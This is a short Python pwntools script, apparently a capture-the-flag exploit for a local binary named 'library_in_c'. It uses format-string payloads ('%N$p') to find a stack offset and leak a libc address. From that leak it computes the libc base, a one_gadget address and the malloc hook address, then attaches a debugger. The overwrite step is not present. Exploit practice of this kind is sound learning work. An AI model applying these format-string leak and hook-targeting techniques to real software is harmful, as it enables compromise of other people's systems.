from pwn import *

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 100):
        p = process("./library_in_c")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendlineafter("name?\n", payload)
        
        p.recvuntil("Why hello there ")
        
        stack_value = p.recvline()[:-1]
        # print "Stack value: {}".format(stack_value)
        if stack_value.find("b97") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./library_in_c")
    p.sendline("%27$p")
    p.recvuntil("there ")
    
    libc_leak = int(p.recvline()[:-1], 16)
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x021b97
    log.info("Libc base : {}".format(hex(libc_base)))
    one_gadget = libc_base + 0x4f2c5
    log.info("One gadget addr : {}".format(hex(one_gadget)))
    libc_malloc = libc_base + 0x3ebc30
    log.info("Libc malloc : {}".format(hex(libc_malloc)))

    gdb.attach(p, 'b *0x0000000000400828')

    p.interactive()

if __name__ == "__main__":
    exploit()
    # offset_finder()